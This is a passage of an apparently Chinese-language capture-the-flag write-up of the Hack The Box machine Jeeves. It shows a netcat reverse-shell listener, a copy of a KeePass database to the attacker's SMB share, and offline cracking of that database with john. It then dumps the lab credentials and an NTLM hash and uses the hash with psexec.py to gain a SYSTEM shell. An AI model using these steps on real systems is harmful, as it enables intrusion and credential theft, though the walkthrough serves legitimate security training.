+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ nc -lvnp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.16.2] from (UNKNOWN) [10.10.10.63] 49677</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">PS C:\Users\Administrator\.jenkins\workspace\<span class="built_in">test</span>&gt; <span class="built_in">ls</span></span><br><span class="line">PS C:\Users\Administrator\.jenkins\workspace\<span class="built_in">test</span>&gt; </span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么不上线cs：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ProgramData&gt; cmd /c <span class="string">&quot;start /b .\code.exe&quot;</span></span><br><span class="line">PS C:\ProgramData&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       10/30/2015   3:24 AM                Comms                                                                 </span><br><span class="line">d---s-        11/5/2017   9:15 PM                Microsoft                                                             </span><br><span class="line">d-----       10/25/2017   4:51 PM                Microsoft OneDrive                                                    </span><br><span class="line">d-----        11/3/2017  10:27 PM                Oracle                                                                </span><br><span class="line">d-----       10/30/2015   5:07 AM                regid.1991-06.com.microsoft                                           </span><br><span class="line">d-----       10/30/2015   3:24 AM                SoftwareDistribution                                                  </span><br><span class="line">d-----       10/25/2017   4:44 PM                USOPrivate                                                            </span><br><span class="line">d-----       10/25/2017   4:44 PM                USOShared                                                             </span><br><span class="line">da----       10/25/2017   4:49 PM                VMware                                                                </span><br><span class="line">-a----        8/29/2022  11:06 AM          12800 code.exe                                                              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\ProgramData&gt; .\code.exe</span><br><span class="line">PS C:\ProgramData&gt; </span><br></pre></td></tr></table></figure>
+
+<p>user.txt:</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\kohsuke&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">PS C:\Users\kohsuke\Desktop&gt; ls</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    Directory: <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Mode</span>                <span class="title">LastWriteTime</span>         <span class="title">Length</span> <span class="title">Name</span>                                                                  </span></span><br><span class="line"><span class="function">----                -------------         ------ ----                                                                  </span></span><br><span class="line"><span class="function">-<span class="title">ar</span>---        11/3/2017  11:22 <span class="title">PM</span>             32 <span class="title">user.txt</span>                                                              </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt; <span class="title">cat</span> <span class="title">user.txt</span></span></span><br><span class="line"><span class="function"><span class="title">e323</span>.....................................</span></span><br></pre></td></tr></table></figure>
+
+<p>或许可以考虑土豆提权：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\kohsuke\Desktop&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name      SID                                        </span><br><span class="line">============== ===========================================</span><br><span class="line">jeeves\kohsuke S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2851396806</span>-<span class="number">8246019</span>-<span class="number">2289784878</span>-<span class="number">1001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                           <span class="built_in">Type</span>             SID          Attributes                                        </span><br><span class="line">==================================== ================ ============ ==================================================</span><br><span class="line">Everyone                             Well-known group S-<span class="number">1</span>-<span class="number">1</span>-<span class="number">0</span>      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                        Alias            S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">32</span>-<span class="number">545</span> Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\SERVICE                 Well-known group S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">6</span>      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">CONSOLE LOGON                        Well-known group S-<span class="number">1</span>-<span class="number">2</span>-<span class="number">1</span>      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users     Well-known group S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">11</span>     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization       Well-known group S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">15</span>     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Local account           Well-known group S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">113</span>    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">LOCAL                                Well-known group S-<span class="number">1</span>-<span class="number">2</span>-<span class="number">0</span>      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication     Well-known group S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">64</span>-<span class="number">10</span>  Mandatory group, Enabled by default, Enabled group</span><br><span class="line"><span class="function">Mandatory Label\<span class="title">High</span> <span class="title">Mandatory</span> <span class="title">Level</span> <span class="title">Label</span>            <span class="title">S</span>-1-16-12288                                                   </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                               <span class="title">State</span>   </span></span><br><span class="line"><span class="function">============================= ========================================= ========</span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>           <span class="title">Shut</span> <span class="title">down</span> <span class="title">the</span> <span class="title">system</span>                      <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>                  <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeUndockPrivilege</span>             <span class="title">Remove</span> <span class="title">computer</span> <span class="title">from</span> <span class="title">docking</span> <span class="title">station</span>      <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeImpersonatePrivilege</span>        <span class="title">Impersonate</span> <span class="title">a</span> <span class="title">client</span> <span class="title">after</span> <span class="title">authentication</span> <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeCreateGlobalPrivilege</span>       <span class="title">Create</span> <span class="title">global</span> <span class="title">objects</span>                     <span class="title">Enabled</span> </span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>            <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeTimeZonePrivilege</span>           <span class="title">Change</span> <span class="title">the</span> <span class="title">time</span> <span class="title">zone</span>                      <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt; <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [<span class="title">Version</span> 10.0.10586]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) 2015 <span class="title">Microsoft</span> <span class="title">Corporation</span>. <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt;</span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt; <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [<span class="title">Version</span> 10.0.10586]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) 2015 <span class="title">Microsoft</span> <span class="title">Corporation</span>. <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt;</span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">kohsuke</span>\<span class="title">Desktop</span>&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>但目标系统似乎运行不了exe。在Document下有个奇怪的文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                  </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">10</span>:<span class="number">51</span> PM                .groovy                                                               </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Contacts                                                              </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">19</span> PM                Desktop                                                               </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">18</span> PM                Documents                                                             </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Downloads                                                             </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Favorites                                                             </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">22</span> PM                Links                                                                 </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Music                                                                 </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">22</span> PM                OneDrive                                                              </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">4</span>/<span class="number">2017</span>   <span class="number">3</span>:<span class="number">10</span> AM                Pictures                                                              </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Saved Games                                                           </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">16</span> PM                Searches                                                              </span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">11</span>/<span class="number">3</span>/<span class="number">2017</span>  <span class="number">11</span>:<span class="number">15</span> PM                Videos                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> Documents </span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\kohsuke\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                  </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">9</span>/<span class="number">18</span>/<span class="number">2017</span>   <span class="number">1</span>:<span class="number">43</span> PM           <span class="number">2846</span> CEH.kdbx                                                              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span> .\CEH.kdbx \\<span class="number">10.10</span>.<span class="number">16.2</span>\share\</span><br><span class="line"><span class="built_in">PS</span> C:\Users\kohsuke\Documents&gt; </span><br></pre></td></tr></table></figure>
+
+<p>尝试破解其中密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ keepass2john CEH.kdbx</span><br><span class="line">CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ keepass2john CEH.kdbx&gt;CEHhash</span><br><span class="line">Crazy:~/HackTheBox$ john CEHhash -w=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (KeePass [SHA256 AES 32/64])</span><br><span class="line">Cost 1 (iteration count) is 6000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">moonshine1       (CEH)     </span><br><span class="line">1g 0:00:00:32 DONE (2022-08-29 23:32) 0.03052g/s 1678p/s 1678c/s 1678C/s nick18..moonshine1</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+
+<p>这个软件是我第一次遇到，根据帮助文档，列出所有密码表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ kpcli --kdb CEH.kdbx                            </span><br><span class="line">Provide the master password: *************************</span><br><span class="line"></span><br><span class="line">KeePass CLI (kpcli) v3.7 is ready <span class="keyword">for</span> operation.</span><br><span class="line">Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a description of available commands.</span><br><span class="line">Type <span class="string">&#x27;help &lt;command&gt;&#x27;</span> <span class="keyword">for</span> details on individual commands.</span><br><span class="line"></span><br><span class="line">kpcli:/&gt; find .</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">&quot;.&quot;</span> ...</span><br><span class="line"> - 8 matches found and placed into /_found/</span><br><span class="line">Would you like to list them now? [y/N] </span><br><span class="line">=== Entries ===</span><br><span class="line">0. Backup stuff                                                           </span><br><span class="line">1. Bank of America                                   www.bankofamerica.com</span><br><span class="line">2. DC Recovery PW                                                         </span><br><span class="line">3. EC-Council                               www.eccouncil.org/programs/cer</span><br><span class="line">4. It<span class="string">&#x27;s a secret                                 localhost:8180/secret.jsp</span></span><br><span class="line"><span class="string">5. Jenkins admin                                            localhost:8080</span></span><br><span class="line"><span class="string">6. Keys to the kingdom                                                    </span></span><br><span class="line"><span class="string">7. Walmart.com                                             www.walmart.com</span></span><br><span class="line"><span class="string">kpcli:/&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>可以制定序号去查看每一条密码：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kpcli:/&gt; <span class="title">show</span> -<span class="title">f</span> 0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Path</span>: /<span class="title">CEH</span>/</span></span><br><span class="line"><span class="function"><span class="title">Title</span>: <span class="title">Backup</span> <span class="title">stuff</span></span></span><br><span class="line"><span class="function"><span class="title">Uname</span>: ?</span></span><br><span class="line"><span class="function"> <span class="title">Pass</span>: <span class="title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span></span></span><br><span class="line"><span class="function">  <span class="title">URL</span>: </span></span><br><span class="line"><span class="function"><span class="title">Notes</span>: </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">kpcli</span>:/&gt; <span class="title">show</span> -<span class="title">f</span> 1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Path</span>: /<span class="title">CEH</span>/</span></span><br><span class="line"><span class="function"><span class="title">Title</span>: <span class="title">Bank</span> <span class="title">of</span> <span class="title">America</span></span></span><br><span class="line"><span class="function"><span class="title">Uname</span>: <span class="title">Michael321</span></span></span><br><span class="line"><span class="function"> <span class="title">Pass</span>: 12345</span></span><br><span class="line"><span class="function">  <span class="title">URL</span>: <span class="title">https</span>://<span class="title">www.bankofamerica.com</span></span></span><br><span class="line"><span class="function"><span class="title">Notes</span>: </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">kpcli</span>:/&gt; <span class="title">show</span> -<span class="title">f</span> 2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Path</span>: /<span class="title">CEH</span>/</span></span><br><span class="line"><span class="function"><span class="title">Title</span>: <span class="title">DC</span> <span class="title">Recovery</span> <span class="title">PW</span></span></span><br><span class="line"><span class="function"><span class="title">Uname</span>: <span class="title">administrator</span></span></span><br><span class="line"><span class="function"> <span class="title">Pass</span>: <span class="title">S1TjAtJHKsugh9oC4VZl</span></span></span><br><span class="line"><span class="function">  <span class="title">URL</span>: </span></span><br><span class="line"><span class="function"><span class="title">Notes</span>: </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">kpcli</span>:/&gt; <span class="title">show</span> -<span class="title">f</span> 3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Path</span>: /<span class="title">CEH</span>/</span></span><br><span class="line"><span class="function"><span class="title">Title</span>: <span class="title">EC</span>-<span class="title">Council</span></span></span><br><span class="line"><span class="function"><span class="title">Uname</span>: <span class="title">hackerman123</span></span></span><br><span class="line"><span class="function"> <span class="title">Pass</span>: <span class="title">pwndyouall</span>!</span></span><br><span class="line"><span class="function">  <span class="title">URL</span>: <span class="title">https</span>://<span class="title">www.eccouncil.org</span>/<span class="title">programs</span>/<span class="title">certified</span>-<span class="title">ethical</span>-<span class="title">hacker</span>-<span class="title">ceh</span></span></span><br><span class="line"><span class="function"><span class="title">Notes</span>: <span class="title">Personal</span> <span class="title">login</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">kpcli</span>:/&gt; <span class="title">show</span> -<span class="title">f</span> 4</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Path</span>: /<span class="title">CEH</span>/</span></span><br><span class="line"><span class="function"><span class="title">Title</span>: <span class="title">It</span>&#x27;<span class="title">s</span> <span class="title">a</span> <span class="title">secret</span></span></span><br><span class="line"><span class="function"><span class="title">Uname</span>: <span class="title">admin</span></span></span><br><span class="line"><span class="function"> <span class="title">Pass</span>: <span class="title">F7WhTrSFDKB6sxHU1cUn</span></span></span><br><span class="line"><span class="function">  <span class="title">URL</span>: <span class="title">http</span>://<span class="title">localhost</span>:8180/<span class="title">secret.jsp</span></span></span><br><span class="line"><span class="function"><span class="title">Notes</span>: </span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
+
+<p>序列号0看起来像是一条hash:</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Crazy:~/<span class="title">HackTheBox</span>$ <span class="title">psexec.py</span> -<span class="title">hashes</span> <span class="title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span> <span class="title">administrator</span>@10.10.10.63 <span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">Impacket</span> <span class="title">v0</span>.10.1.<span class="title">dev1</span>+20220720.103933.3<span class="title">c6713e3</span> - <span class="title">Copyright</span> 2022 <span class="title">SecureAuth</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[*] <span class="title">Requesting</span> <span class="title">shares</span> <span class="title">on</span> 10.10.10.63.....</span></span><br><span class="line"><span class="function">[*] <span class="title">Found</span> <span class="title">writable</span> <span class="title">share</span> <span class="title">ADMIN</span>$</span></span><br><span class="line"><span class="function">[*] <span class="title">Uploading</span> <span class="title">file</span> <span class="title">GXOdPUzo.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Opening</span> <span class="title">SVCManager</span> <span class="title">on</span> 10.10.10.63.....</span></span><br><span class="line"><span class="function">[*] <span class="title">Creating</span> <span class="title">service</span> <span class="title">WXKS</span> <span class="title">on</span> 10.10.10.63.....</span></span><br><span class="line"><span class="function">[*] <span class="title">Starting</span> <span class="title">service</span> <span class="title">WXKS</span>.....</span></span><br><span class="line"><span class="function">[!] <span class="title">Press</span> <span class="title">help</span> <span class="title">for</span> <span class="title">extra</span> <span class="title">shell</span> <span class="title">commands</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [<span class="title">Version</span> 10.0.10586]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) 2015 <span class="title">Microsoft</span> <span class="title">Corporation</span>. <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt; <span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE50-B1C9</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span><br><span class="line">12/24/2017  03:51 AM                36 hm.txt</span><br><span class="line">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span><br><span class="line">               2 File(s)            833 bytes</span><br><span class="line">               2 Dir(s)   7,478,935,552 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; <span class="built_in">type</span> hm.txt</span><br><span class="line">The flag is elsewhere.  Look deeper.</span><br><span class="line">C:\Users\Administrator\Desktop&gt; <span class="built_in">dir</span> /R</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE50-B1C9</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">11/08/2017  